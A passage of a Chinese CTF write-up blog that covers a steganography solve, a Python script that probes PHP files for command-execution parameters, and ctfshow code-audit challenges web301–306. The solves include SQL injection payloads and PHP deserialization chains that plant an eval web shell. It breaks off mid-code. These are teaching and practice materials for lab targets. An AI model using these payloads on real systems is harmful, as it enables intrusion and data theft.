解密得到key：<code>_1s_E45y</code></p><p>然后我们观察一下图片，猜测是 <code>lsb隐写</code></p><img src="https://s2.loli.net/2023/03/05/IunqNe9Spv6DhXi.png" alt="image-20230305144102200" style="zoom:33%;" /><p>但是 <code>stegsolve</code> 得到一串不知道什么得东西，我们猜测这是加密的lsb隐写，</p><p>我们可以使用 <code>lsb隐写脚本</code>: <strong>cloacked-pixel</strong></p><p>结合之前我们得到的key，我们解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python2 lsb.py extract encode.png flag.txt _1s_E45y<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/05/EhGy6nVgcB2feYI.png" alt="image-20230305144553874"></p><p>得到flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>黄河公安技能挑战赛(WP)</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>高明的黑客</title>
    <link href="/2023/08/24/%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/"/>
    <url>/2023/08/24/%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>我们下载网页源码：</p><img src="https://s2.loli.net/2023/01/13/DadbPemroJRp18H.png" alt="image-20230113212007936" style="zoom: 50%;" /><p>发现里面居然有3000个文件，这只能脚本来找了。</p><p>我们先随便进一个文件：</p><img src="https://s2.loli.net/2023/01/13/shHIWXaP4TV8kwr.png" alt="image-20230113212257594" style="zoom:33%;" /><p>我们发现有些传递进去的参数会被赋值为空，这样就不能够命令执行了，我们需要通过脚本找出传递进行的参数能够进行命令执行并且回显在页面的参数。</p><p>因此我们编写脚本。</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> threading<br><br><span class="hljs-keyword">import</span> requests<br><br>filepath = <span class="hljs-string">r&quot;D:\Applications\CTF\phpstudy_pro\WWW\src&quot;</span><br>uri = <span class="hljs-string">&quot;http://127.0.0.1/src/&quot;</span><br>os.chdir(filepath)  <span class="hljs-comment">#改变当前操作目录的路径</span><br>files = os.listdir(filepath) <span class="hljs-comment">#将指定路径下文件或文件夹名称的列表</span><br>syn = threading.Semaphore(<span class="hljs-number">100</span>)  <span class="hljs-comment"># 设置线程数最大为100</span><br><span class="hljs-comment"># requests = requests.Session()</span><br><span class="hljs-comment"># requests.adapters.DEFAULT_RETRIES = 5</span><br><span class="hljs-comment"># print(files)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getAnswer</span>(<span class="hljs-params">file</span>):<br>    syn.acquire()  <span class="hljs-comment"># 线程锁</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--filename:&quot;</span> + file)<br>    f = <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&quot;r&quot;</span>)<br>    content = f.read() <span class="hljs-comment">#读取文件所有内容</span><br>    f.close()<br>    <span class="hljs-comment"># print(content)</span><br>    gets = re.findall(<span class="hljs-string">r&quot;\$_GET\[\&#x27;(.*?)\&#x27;\]&quot;</span>, content) <span class="hljs-comment">#返回满足正则的get参数名列表</span><br>    <span class="hljs-comment"># print(gets)</span><br>    res = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;\$_POST\[\&#x27;(.*?)\&#x27;\]&quot;</span>) <br>    posts = res.findall(content) <span class="hljs-comment">#返回满足正则的post参数名列表</span><br>    <span class="hljs-comment"># print(posts)</span><br>    parama = &#123;&#125;<br>    data = &#123;&#125;<br>    url = uri + file<br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> gets:<br>        parama[m] = <span class="hljs-string">&quot;echo xxxxxx&quot;</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> posts:<br>        data[n] = <span class="hljs-string">&quot;echo xxxxxx&quot;</span><br>    <span class="hljs-comment"># print(parama)</span><br><br>    resp_p = requests.post(url=url, data=data)<br>    resp_p.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br>    p_text = resp_p.text<br><br>    <span class="hljs-comment"># print(p_text)</span><br><br>    resp_g = requests.get(url=url, params=parama) <span class="hljs-comment"># 将get参数列表，一次性传递给指定url</span><br>    resp_g.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br>    g_text = resp_g.text<br>    <span class="hljs-comment"># print(parama)</span><br>    <span class="hljs-comment"># print(g_text)</span><br>    <span class="hljs-comment"># print(list(gets))</span><br>    resp_g.close()<br>    resp_p.close()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> p_text: <span class="hljs-comment"># 如果为post传参</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;----post-&quot;</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> posts:<br>            resp = requests.post(url=url, data=&#123;i: <span class="hljs-string">&quot;echo xxxxxx;&quot;</span>&#125;)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> resp.text: <span class="hljs-comment"># 确定post参数名</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-------文件名:&quot;</span> + file + <span class="hljs-string">&quot;参数名:&quot;</span> + i)<br>                exit(<span class="hljs-number">0</span>)<br>            resp.close()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> g_text: <span class="hljs-comment">#确定为get参数</span><br>        <span class="hljs-comment"># print(&quot;----get-&quot;)</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> gets:<br>            resp = requests.get(url=url + <span class="hljs-string">&quot;?&quot;</span> + i + <span class="hljs-string">&quot;=echo xxxxxx;&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> resp.text: <span class="hljs-comment"># 确定get参数名</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-------文件名:&quot;</span> + file + <span class="hljs-string">&quot;参数名:&quot;</span> + i)<br>                exit(<span class="hljs-number">0</span>)<br>            resp.close()<br>    syn.release() <span class="hljs-comment">#释放线程锁</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:<br>        thread = threading.Thread(target=getAnswer, args=(file,)) <span class="hljs-comment">#将file作为参数传给getAnswer()函数</span><br>        thread.start() <span class="hljs-comment">#启动线程</span><br></code></pre></td></tr></table></figure><p>编写该脚本需要了解几个知识点：</p><h3 id="os-chdir"><a href="#os-chdir" class="headerlink" title="os.chdir()"></a>os.chdir()</h3><blockquote><p><strong>os.chdir(path)</strong> 方法用于改变当前工作目录到指定的路径。</p><ul><li><strong>path</strong> – 要切换到的新路径。</li></ul></blockquote><h3 id="os-listdir"><a href="#os-listdir" class="headerlink" title="os.listdir()"></a>os.listdir()</h3><blockquote><p><strong>os.listdir(path)</strong> 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。</p><ul><li><strong>path</strong> – 需要列出的目录路径</li></ul></blockquote><h3 id="threading-Semaphore-value-x"><a href="#threading-Semaphore-value-x" class="headerlink" title="threading.Semaphore(value&#x3D;x)"></a>threading.Semaphore(value&#x3D;x)</h3><blockquote><p> s&#x3D;threading.Semaphore(value&#x3D;10)，value 指示信号量的最大计数，默认是1；在代码设计中可以理解为可用资源数目。(线程数)</p></blockquote><p><code>threading</code>模块中的信号量<code>Semaphore</code>对象. 其有两个操作函数, 即<code>acquire()</code>和<code>release()</code>.</p><h3 id="Semaphore之acquire"><a href="#Semaphore之acquire" class="headerlink" title="Semaphore之acquire()"></a>Semaphore之acquire()</h3><blockquote><p>将共享资源锁起来</p></blockquote><h3 id="Semaphore之release"><a href="#Semaphore之release" class="headerlink" title="Semaphore之release()"></a>Semaphore之release()</h3><blockquote><p>释放锁</p></blockquote><h3 id="threading-Thread"><a href="#threading-Thread" class="headerlink" title="threading.Thread()"></a>threading.Thread()</h3><blockquote><p><code>threading.Thread(group=None, tatget=None,args=(), kwargs =&#123;&#125;, verbose=None, daemon=None)</code>创建线程类对象，需要有一个可调用的 target，以及其参数 args或 kwargs。</p><p>start() 启动线程</p></blockquote><h3 id="requests-get"><a href="#requests-get" class="headerlink" title="requests.get()"></a>requests.get()</h3><p><code>requests.get(url=url,params=params)</code> 可以一次传入多个get型参数，参数<code>params</code> 要是字典的形式</p><h3 id="re-findall"><a href="#re-findall" class="headerlink" title="re.findall()"></a>re.findall()</h3><blockquote><p>re.findall(pattern, string, flags&#x3D;0))：返回string中所有与pattern相匹配的全部字符串，得到<strong>列表</strong>.</p><p>pattern 符合正则表达式规则</p></blockquote><h4 id="注意点："><a href="#注意点：" class="headerlink" title="注意点："></a>注意点：</h4><p><strong><code>.*</code></strong> <strong>贪婪匹配</strong>，匹配从<code>.*</code>前面开始到后面结束的所有内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;aabbabaabbaa&#x27;</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;a.*b&#x27;</span>,<span class="hljs-built_in">str</span>))<br><br><span class="hljs-comment">#输出：</span><br>[<span class="hljs-string">&#x27;aabbabaabb&#x27;</span>]<br></code></pre></td></tr></table></figure><p><strong><code>.*?</code></strong> <strong>非贪婪</strong>，遇到开始和结束就进行截取，因此截取多次符合的结果，中间没有字符也会被截取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;aabbabaabbaa&#x27;</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;a.*?b&#x27;</span>,<span class="hljs-built_in">str</span>))<br><br><span class="hljs-comment">#输出</span><br>[<span class="hljs-string">&#x27;aab&#x27;</span>, <span class="hljs-string">&#x27;ab&#x27;</span>, <span class="hljs-string">&#x27;aab&#x27;</span>]<br></code></pre></td></tr></table></figure><p>如果<code>re.findall()</code>正则表达式出现 **<code>(.*?)</code>**比上面多了个括号， <strong>只会保留括号内的内容</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;aabbabaabbaa&#x27;</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;a(.*?)b&#x27;</span>,<span class="hljs-built_in">str</span>)) <span class="hljs-comment"># r表示不转义，以原始字符串表示</span><br><br><span class="hljs-comment">#输出：</span><br>[<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>]<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">gets = re.findall(<span class="hljs-string">r&quot;\$_GET\[\&#x27;(.*?)\&#x27;\]&quot;</span>, content) <span class="hljs-comment">#返回满足正则的get参数名列表</span><br>   <br>res = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;\$_POST\[\&#x27;(.*?)\&#x27;\]&quot;</span>) <br>posts = res.findall(content) <span class="hljs-comment">#返回满足正则的post参数名列表</span><br></code></pre></td></tr></table></figure><p>上面脚本中的正则匹配，记得使用正则时记得加上小括号 <strong>()</strong> ，这样匹配到后，只会获得小括号中内容，否则列表中会存在 <code>$_POST、$_GET</code> 等字段，影响最后的结果。（这里调试了好久。。）</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>高明的黑客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计</title>
    <link href="/2023/08/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2023/08/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="【ctfshow】代码审计"><a href="#【ctfshow】代码审计" class="headerlink" title="【ctfshow】代码审计"></a>【ctfshow】代码审计</h2><h3 id="web301"><a href="#web301" class="headerlink" title="web301"></a>web301</h3><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305222044970.png" alt="image-20230522204435835"></p><p>审计一下，存在sql注入漏洞，我们使用union：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305222045955.png" alt="image-20230522204514927"></p><p>让输入的密码与查询出来的密码相等即可</p><h3 id="web302"><a href="#web302" class="headerlink" title="web302"></a>web302</h3><blockquote><p>修改的地方： <code>if(!strcasecmp(sds_decode($userpwd),$row[&#39;sds_password&#39;]))&#123; </code></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sds_decode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&quot;sds&quot;</span>))).<span class="hljs-string">&quot;sds&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>当 <code>$userpwd=1</code>时： <code>sds_decode($userpwd) = d9c77c4e454869d5d8da3b4be79694d3</code></p><p>因此，我们只需要密码传参：1，然后用户名使用联合查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; union select &#x27;</span>d9c77c4e454869d5d8da3b4be79694d3<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><p>注意需要将<strong>数字使用单引号包裹</strong>起来</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305222049219.png" alt="image-20230522204953183"></p><h3 id="web303"><a href="#web303" class="headerlink" title="web303"></a>web303</h3><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305222055137.png" alt="image-20230522205533087"></p><p>这一题用户名长度增加了限制，小于6位，</p><p>但是从sql表中找到一条数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `sds_user` <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;27151b7b1ad51a38ea66b1529cde5ee4&#x27;</span>);<br></code></pre></td></tr></table></figure><p><code>admin</code>经过 <code>sds_decode()</code>函数加密刚好为：<code>27151b7b1ad51a38ea66b1529cde5ee4</code></p><p>因此可以直接登录进去 <code>admin   admin</code></p><p>注入点：<code>dptadd.php</code></p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305222107664.png" alt="image-20230522210704592"></p><p>然后会在：<code>dpt.php</code>回显出来</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305222107133.png" alt="image-20230522210736092" style="zoom: 67%;" /><p>典型的二次注入</p><p>我们这样注入：查询库名</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305222110558.png" alt="image-20230522211054524"></p><p>查表名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;,sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())#1</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305222113501.png" alt="image-20230522211306461"></p><p>查列名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;,sds_address=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>sds_fl9g<span class="hljs-string">&#x27;)#1</span><br></code></pre></td></tr></table></figure><p><code>flag</code></p><p>查数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;,sds_address=(select flag from sds_fl9g)#</span><br></code></pre></td></tr></table></figure><h3 id="web304"><a href="#web304" class="headerlink" title="web304"></a>web304</h3><blockquote><p>增加了全局waf </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sds_waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123; <br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]|[a-z]|-/i&#x27;</span>, <span class="hljs-variable">$str</span>); <br>&#125; <br></code></pre></td></tr></table></figure></blockquote><p>同上</p><h3 id="web305"><a href="#web305" class="headerlink" title="web305"></a>web305</h3><p>这一题给插入的数据使用了waf，不能走sql注入了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sds_waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\~|\`|\!|\@|\#|\$|\%|\^|\&amp;|\*|\(|\)|\_|\+|\=|\&#123;|\&#125;|\[|\]|\;|\:|\&#x27;|\&quot;|\,|\.|\?|\/|\\\|\&lt;|\&gt;/&#x27;</span>, <span class="hljs-variable">$str</span>))&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们在 <code>class.php</code>中发现可利用的点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$u</span>;<br><span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$p</span>;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-variable">$this</span>-&gt;password);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>析构方法可以写入文件。</p><p>在<code>checklogin.php</code>发现反序列化</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305222134802.png" alt="image-20230522213454762"></p><p>因此我们构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>();<br><span class="hljs-variable">$a</span>-&gt;username=<span class="hljs-string">&quot;1.php&quot;</span>;<br><span class="hljs-variable">$a</span>-&gt;password=<span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;1.php&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;&lt;?php eval(<span class="hljs-subst">$_POST</span>[1]);?&gt;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>cookie传参(注意url编码)</p><p>然后就可以使用蚁剑连接了，</p><p>但是flag存在数据库中：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305222148415.png" alt="image-20230522214852360"></p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305222149289.png" alt="image-20230522214906249"></p><h3 id="web306"><a href="#web306" class="headerlink" title="web306"></a>web306</h3><blockquote><p>开始使用mvc结构</p></blockquote><p>在class.php中发现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">log</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$title</span>=<span class="hljs-string">&#x27;log.txt&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$info</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loginfo</span>(<span class="hljs-params"><span class="hljs-variable">$info</span></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;info=<span class="hljs-variable language_">$this</span>-&gt;info.<span class="hljs-variable">$info</span>;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;title, <span class="hljs-variable">$this</span>-&gt;info);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以利用 <code>file_put_contents()</code>写入一句话木马</p><p>但是我们需要想办法调用 <code>close()</code>方法</p><p>在dao.php中发现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dao</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$config</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$conn</span>;<br><br>...<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>&#125;<br><br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>dao类的析构方法会调用 close方法，所以我们只需要将<code>$conn</code>改为log类对象即可</p><p>然后在index.php中发现反序列化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">require</span> <span class="hljs-string">&quot;conn.php&quot;</span>;<br><span class="hljs-keyword">require</span> <span class="hljs-string">&quot;dao.php&quot;</span>;<br><span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]));<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$user</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;location:login.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">log</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$title</span>=<span class="hljs-string">&#x27;1.php&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$info</span>=<span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;<br><br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dao</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$conn</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> 